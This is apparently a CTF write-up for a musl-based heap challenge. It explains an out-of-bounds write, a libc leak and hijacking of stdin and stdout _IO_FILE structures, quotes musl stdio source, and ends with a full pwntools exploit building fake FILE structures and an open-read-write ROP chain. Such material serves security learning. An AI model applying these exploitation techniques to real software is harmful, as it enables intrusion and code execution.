The program is compiled with **muslgcc**. It provides two functions: `add` and `show`, each of which can only be used once. In the `add` function, the `offset` check is flawed: it only validates a single byte for the size boundary, yet the input and usage are 4 bytes and 2 bytes respectively. This allows us to bypass the check via a specific overflow construction, resulting in a **Heap Out-of-Bounds (OOB)** array access.

In **musl**, heap and libc addresses are adjacent. Residual addresses often remain on the newly allocated heap; by using a fixed offset, we can leak the **libc base address**. Through the OOB vulnerability, we can achieve **Arbitrary Address Write** within libc. To exploit libc, we aim to hijack the `_IO_FILE` structure to leak a stack address and subsequently hijack the return address. Since a sandbox is active, we must use an **ORW (Open-Read-Write)** chain to read the flag.

### Analyzing IO_FILE Exploitation from Source

Since each function is limited to a single use, and `show` is used to leak libc, we must accomplish the following three tasks within a single `add` call:

1. **Hijack `stdout`'s IOFILE**: Force the `puts` function to leak a stack address (**Arbitrary Address Read**).
2. **Hijack `stdin`'s IOFILE**: Force the `scanf` function in the main loop to write a ROP chain onto the stack (**Arbitrary Address Write**).

To achieve both, we face a dependency: writing the ROP chain requires knowing the stack address, which is only leaked after `puts` finishes. Therefore, we need a **two-stage Arbitrary Write**. In the first `IOFILE` hijack, we set the target of the arbitrary write to `stdin`'s `IOFILE`. This grants us a second hijack capability after the stack address is leaked.

**Note:** Certain function pointers within `IOFILE` must remain intact. Keep `flags` as `9` for read operations and `5` for write operations.

### `_IO_FILE` Structure Definition

```c
#define F_PERM 1
#define F_NORD 4
#define F_NOWR 8
#define F_EOF 16
#define F_ERR 32
#define F_SVB 64
#define F_APP 128

struct _IO_FILE {
	unsigned flags;
	unsigned char *rpos, *rend;
	int (*close)(FILE *);
	unsigned char *wend, *wpos;
	unsigned char *mustbezero_1;
	unsigned char *wbase;
	size_t (*read)(FILE *, unsigned char *, size_t);
	size_t (*write)(FILE *, const unsigned char *, size_t);
	off_t (*seek)(FILE *, off_t, int);
	unsigned char *buf;
	size_t buf_size;
	FILE *prev, *next;
	int fd;
	int pipe_pid;
	long lockcount;
	int mode;
	volatile int lock;
	int lbf;
	void *cookie;
	off_t off;
	char *getln_buf;
	void *mustbezero_2;
	unsigned char *shend;
	off_t shlim, shcnt;
	FILE *prev_locked, *next_locked;
	struct __locale_struct *locale;
};
```



### `scanf` Internals

`scanf` → `vscanf` → `vfscanf` → `shgetc` → `uflow` → `f->read()`. 
Typically, the `read` pointer in the file structure points to `__stdio_read`.

```c
#define shgetc(f) (((f)->rpos != (f)->shend) ? *(f)->rpos++ : __shgetc(f))

int __shgetc(FILE *f)
{
	int c;
	off_t cnt = shcnt(f);
	if (f->shlim && cnt >= f->shlim || (c=__uflow(f)) < 0) {
		f->shcnt = f->buf - f->rpos + cnt;
		f->shend = f->rpos;
		f->shlim = -1;
		return EOF;
	}
	cnt++;
	if (f->shlim && f->rend - f->rpos > f->shlim - cnt)
		f->shend = f->rpos + (f->shlim - cnt);
	else
		f->shend = f->rend;
	f->shcnt = f->buf - f->rpos + cnt;
	if (f->rpos[-1] != c) f->rpos[-1] = c;
	return c;
}

int __uflow(FILE *f)
{
	unsigned char c;
	if (!__toread(f) && f->read(f, &c, 1)==1) return c;
	return EOF;
}


size_t __stdio_read(FILE *f, unsigned char *buf, size_t len)
{
struct iovec iov[2] = {
    { .iov_base = buf, .iov_len = len - !!f->buf_size },
    { .iov_base = f->buf, .iov_len = f->buf_size }
};
ssize_t cnt;

cnt = iov[0].iov_len ? syscall(SYS_readv, f->fd, iov, 2)
    : syscall(SYS_read, f->fd, iov[1].iov_base, iov[1].iov_len);
if (cnt <= 0) {
    f->flags |= cnt ? F_ERR : F_EOF;
    return 0;
}
if (cnt <= iov[0].iov_len) return cnt;
cnt -= iov[0].iov_len;
f->rpos = f->buf;
f->rend = f->buf + cnt;
if (f->buf_size) buf[len-1] = *f->rpos++;
return len;
}
```

To achieve **Arbitrary Address Write**, we must satisfy:

- `f->buf` is the target write address.
- `f->buf_size` is the write size.
- `f->fd` is set to `0` (stdin).
- `f->rpos != f->shend`
- `f->shlim == 0`

### `puts` Internals

`puts` → `fputs_unlocked` → `fwrite_unlocked` → `__fwritex` → `f->write()`. 
Typically, the `write` pointer points to `__stdio_write`.

```c
size_t __stdio_write(FILE *f, const unsigned char *buf, size_t len)
{
struct iovec iovs[2] = {
    { .iov_base = f->wbase, .iov_len = f->wpos-f->wbase },
    { .iov_base = (void *)buf, .iov_len = len }
};
struct iovec *iov = iovs;
size_t rem = iov[0].iov_len + iov[1].iov_len;
int iovcnt = 2;
ssize_t cnt;
for (;;) {
    cnt = syscall(SYS_writev, f->fd, iov, iovcnt);
    if (cnt == rem) {
        f->wend = f->buf + f->buf_size;
        f->wpos = f->wbase = f->buf;
        return len;
    }
    if (cnt < 0) {
        f->wpos = f->wbase = f->wend = 0;
        f->flags |= F_ERR;
        return iovcnt == 2 ? 0 : len-iov[0].iov_len;
    }
    rem -= cnt;
    if (cnt > iov[0].iov_len) {
        cnt -= iov[0].iov_len;
        iov++; iovcnt--;
    }
    iov[0].iov_base = (char *)iov[0].iov_base + cnt;
    iov[0].iov_len -= cnt;
}
}
```

To achieve **Arbitrary Address Read** (Leak):

- `f->wbase` is the target leak address.
- `f->fd` is set to `1` (stdout).
- `f->wpos` is the target address + leak length (termination address).
- `f->wend` is `f->wpos` + leak length.

------

## EXP (Exploit Script)

Python

```python
from pwn import *
context.log_level='debug'

r=process('./pwn')
libc=ELF('./libc.so')

def cmd(choice):
    r.sendlineafter(b'>>',choice)

def add(idx,content):
    cmd(b'1')
    r.sendlineafter(b'offset:\n',str(idx).encode())
    r.sendafter(b'Content:\n',content)
    
# Leak libc address. In musl, the heap is immediately adjacent to libc (verifiable via debugging).
# Residual addresses in the heap allow leakage via a fixed offset.
cmd(b'2')
libc_base=u64(r.recv(6).ljust(8,b'\x00'))-0x292e50
print('libcbase:'+hex(libc_base))

# gdb.attach(r,'b *$rebase(0xA9F)')
# pause()

payload = p64(0)*4+p64(9)+p64(1)*2
payload += p64(libc.sym["__stdio_close"]+libc_base)
payload += p64(0)*4+p64(libc_base+libc.sym["__stdio_read"])
payload += p64(0)+p64(libc_base+libc.sym["__stdio_seek"])
payload += p64(0x292200+libc_base)+p64(0x300)
payload += p64(0)*5
payload += p64(0xffffffffffffffff)
payload += p64(0xffffffff)
payload += p64(0)*12
payload += p64(5)
payload += p64(0)*2+p64(libc.sym["__stdio_close"]+libc_base)
payload += p64(libc_base+libc.sym["environ"] + 0x8 + 0x8)# Leak stack address
payload += p64(libc_base+libc.sym["environ"] + 0x8)
payload += p64(0)
payload += p64(libc_base+libc.sym["environ"])
add(0xffffce20,payload)# stderr_FILE+224   0x2921E0
stack_addr=u64(r.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print(hex(stack_addr))

payload = p64(9)+p64(1)*2
payload += p64(libc.sym["__stdio_close"]+libc_base)
payload += p64(0)*4+p64(libc_base+libc.sym["__stdio_read"])
payload += p64(0)+p64(libc_base+libc.sym["__stdio_seek"])
payload += p64(stack_addr-0x360)+p64(0x100)
payload += p64(0)*5
payload += p64(0xffffffffffffffff)
payload += p64(0xffffffff)
payload += p64(0)*12

rdi = 0x14862 + libc_base
rsi = 0x1c237 + libc_base
rdx = 0x1bea2 + libc_base
rax = 0x1b826 + libc_base
syscall = 0x247d5 + libc_base
rdi_rax = 0x6ee0e+libc_base

orw = p64(rdi_rax)+p64(stack_addr-0x360+0xf0)
orw += p64(rsi)+p64(rsi)+p64(0)+p64(rdx)+p64(0x40)
orw += p64(rax)+p64(2)+p64(syscall)
orw += p64(rdi)+p64(3)+p64(rsi)+p64(stack_addr-0x360+0x200)
orw += p64(rax)+p64(0)+p64(syscall)
orw += p64(rax)+p64(1)+p64(rdi)+p64(1)+p64(syscall)
orw = orw.ljust(0xf0,b'\x00')
orw += b"flag\x00\x00\x00\x00"

r.sendlineafter(b'>>',payload)
sleep(1)
r.send(orw)

r.interactive()
```